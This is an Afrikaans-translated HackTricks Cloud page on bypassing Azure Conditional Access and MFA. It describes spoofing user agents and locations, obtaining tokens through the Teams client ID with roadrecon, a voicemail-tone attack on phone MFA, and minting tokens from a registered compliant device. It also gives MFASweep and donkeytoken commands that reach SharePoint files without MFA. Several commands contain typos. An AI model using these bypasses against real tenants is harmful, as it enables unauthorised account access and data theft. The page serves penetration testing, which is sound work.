# Az - Voorwaardelike Toegang Beleide / MFA Omseiling

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Ekspert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

Azure Voorwaardelike Toegang beleide is re√´ls wat in Microsoft Azure opgestel is om toegangbeheer na Azure dienste en toepassings af te dwing op grond van sekere **voorwaardes**. Hierdie beleide help organisasies om hul hulpbronne te beveilig deur die regte toegangbeheer onder die regte omstandighede toe te pas.\
Voorwaardelike toegang beleide **definieer** basies **Wie** kan toegang h√™ tot **Wat** van **Waar** en **Hoe**.

Hier is 'n paar voorbeelde:

1. **Aanmeld Risiko Beleid**: Hierdie beleid kan ingestel word om multi-faktor verifikasie (MFA) te vereis wanneer 'n aanmeld risiko opgespoor word. Byvoorbeeld, as 'n gebruiker se aanmeld gedrag ongewoon is in vergelyking met hul gereelde patroon, soos om van 'n ander land aan te meld, kan die stelsel vra om addisionele verifikasie.
2. **Toestel Nakoming Beleid**: Hierdie beleid kan toegang tot Azure dienste beperk slegs tot toestelle wat voldoen aan die organisasie se sekuriteitsstandaarde. Byvoorbeeld, toegang kan slegs toegestaan word vanaf toestelle wat op datum antivirus sagteware het of 'n sekere bedryfstelsel weergawe gebruik.

## Voorwaardelike Toegang Beleide Omseilings

Dit is moontlik dat 'n voorwaardelike toegang beleid **sekere inligting nagaan wat maklik gemanipuleer kan word, wat 'n omseiling van die beleid toelaat**. En as die beleid byvoorbeeld MFA geconfigureer het, sal die aanvaller in staat wees om dit te omseil.

### Toestel Platforms - Toestel Voorwaarde

Dit is moontlik om 'n voorwaarde in te stel gebaseer op die **toestel platform** (Android, iOS, Windows, macOS), egter, dit is gebaseer op die **gebruikers-agent** so dit is redelik maklik om te omseil. Selfs **al die opsies MFA afdwing**, as jy 'n **gebruikers-agent gebruik wat dit nie herken nie**, sal jy in staat wees om die MFA te omseil.

### Plekke: Lande, IP-reekse - Toestel Voorwaarde

Natuurlik, as dit in die voorwaardelike beleid ingestel is, kan 'n aanvaller eenvoudig 'n **VPN** in die **toegelate land** gebruik of probeer om 'n manier te vind om toegang te verkry vanaf 'n **toegelate IP adres** om hierdie voorwaardes te omseil.

### Office365 Kli√´nt Toepassings

Jy kan aandui dat as kli√´nte **Office 365 toepassings vanaf die blaaiers toegang, hulle MFA nodig het**:

<figure><img src="../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Om dit te omseil, is dit moontlik om voor te gee dat jy in 'n toepassing aanmeld vanaf 'n desktop toepassing (soos Microsoft Teams in die volgende voorbeeld) wat die beskerming sal omseil:
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokrns-stdout

<token>
```
Aangesien die Microsoft Teams-app baie toestemmings het, sal jy daardie toegang kan gebruik.

{% hint style="success" %}
Jy kan die I**D van meer openbare toepassings** met vooraf gedefinieerde Office365-toestemmings in die databasis van roadtools vind:

{% code overflow="wrap" %}
```sql
SELECT appId, displayName FROM ApplicationRefs WHERE publicCLient = 1 ORDER BY displayName ASC
```
{% endcode %}
{% endhint %}

Hierdie aanval is spesiaal interessant omdat openbare Office365 toepassings standaard toestemming sal h√™ om sekere data te bekom.

### Ander toepassings

Standaard sal ander toepassings wat deur gebruikers geskep is nie toestemming h√™ nie en kan privaat wees.\
Egter, gebruikers kan ook **openbare** **toepassings** skep wat hulle sekere **toestemmings** gee.

'n Potensi√´le scenario waar 'n beleid ingestel is om **MFA te vereis om toegang tot 'n toepassing** te verkry wanneer die gebruiker 'n **blaaier** gebruik (miskien omdat dit 'n webtoepassing is en daarom die enigste manier sal wees), as daar 'n **proxy-toepassing** is - 'n toepassing wat toegelaat word om **met ander toepassings namens gebruikers te kommunikeer** - kan die gebruiker **in die proxy-toepassing aanmeld** en dan deur hierdie proxy-toepassing **in die aanvanklik MFA-beskermde toepassing aanmeld**.

Kyk na die [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) en die [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) tegnieke.

## Ander Az MFA Omseilings

### Ringtone

Een Azure MFA opsie is om **'n oproep in die geconfigureerde telefoonnommer te ontvang** waar die gebruiker gevra sal word om die karakter `#` te **stuur**.

{% hint style="danger" %}
Aangesien karakters net **toon** is, kan 'n aanvaller die **stempos** boodskap van die telefoonnommer **kompromitteer**, die **toon van `#`** as die boodskap konfigureer en dan, wanneer die MFA aangevra word, verseker dat die **slagoffer se telefoon besig is** (dit bel) sodat die Azure oproep na die stempos omgelei word.
{% endhint %}

### Voldoen aan Toestelle

Beleide vra dikwels vir 'n voldoenende toestel of MFA, so 'n **aanvaller kan 'n voldoenende toestel registreer**, 'n **PRT** token verkry en **op hierdie manier die MFA omseil**.

Begin deur 'n **voldoenende toestel in Intune te registreer**, dan **kry die PRT** met:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Vind meer inligting oor hierdie tipe aanval op die volgende bladsy:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Gereedskap

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Kry al die beleide
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep is 'n PowerShell-skrip wat probeer om **in te log op verskeie Microsoft-dienste met 'n verskafde stel geloofsbriewe en sal probeer om te identifiseer of MFA geaktiveer is**. Afhangende van hoe voorwaardelike toegangbeleide en ander multi-faktor verifikasie-instellings geconfigureer is, kan sommige protokolle eindig as enkel-faktor. Dit het ook 'n addisionele kontrole vir ADFS-konfigurasies en kan probeer om in te log op die on-prem ADFS-bediener indien opgespoor.
```bash
Invoke-MFASweep -Username <username> -Password <pass>
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token is 'n stel funksies wat daarop gemik is om sekuriteitskonsultante te help wat die Voorwaardelike Toegang Beleide moet valideer, toetse vir 2FA-geaktiveerde Microsoft-portale, ens.
```powershell
Import-Module 'C:\Users\Administrador\Desktop\Azure\Modulos ps1\donkeytoken' -Force
```
**Toets elke portaal** of dit moontlik is om **in te log sonder MFA**:
```powershell
Test-MFA -credential $cred -Verbose -Debug -InformationAction Continue
```
Omdat die **Azure** **portaal** **nie beperk** is nie, is dit moontlik om 'n **token van die portaal-eindpunt te versamel om enige diens wat deur die vorige uitvoering opgespoor is, te bekom**. In hierdie geval is Sharepoint ge√Ødentifiseer, en 'n token om toegang daartoe te verkry, word aangevra:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

As ons aanneem dat die token die toestemming Sites.Read.All (van Sharepoint) het, selfs al kan jy nie Sharepoint vanaf die web toegang nie weens MFA, is dit moontlik om die token te gebruik om toegang tot die l√™ers te verkry met die gegenereerde token:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Verwysings

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekening planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
